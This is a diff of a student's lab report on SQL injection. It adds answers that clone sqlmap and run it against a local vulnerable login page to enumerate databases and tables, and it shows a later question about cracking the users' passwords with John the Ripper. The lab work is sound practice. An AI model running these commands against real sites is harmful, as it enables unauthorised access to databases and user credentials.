@@ -136,8 +136,23 @@ Then we check again the /cat/host directory, we have see the new part 127.1.1.1 
 **Question 1**: Use sqlmap to get information about all available databases
 **Answer 1**:
 
+git clone https://github.com/sqlmapproject/sqlmap.git
+![createpicture](./img2/sqlmapgitclone.png)
+
+Find the available database
+````
+python sqlmap.py -u "http://localhost:3128/unsafe_home.php?username=1&Password=1"  --dbs
+````
+![createpicture](./img2/findthenamedbs.png)
+
+At the end we have information of the database
+![createpicture](./img2/nameofdbs.png)
+
 **Question 2**: Use sqlmap to get tables, users information
 **Answer 2**:
-
+````
+python sqlmap.py -u "http://localhost:3128/unsafe_home.php?username=1&Password=1" -D sqllab_users --tables
+````
+![createpicture](./img2/getTableofDatabase.png)
 **Question 3**: Make use of John the Ripper to disclose the password of all database users from the above exploit
 **Answer 3**:
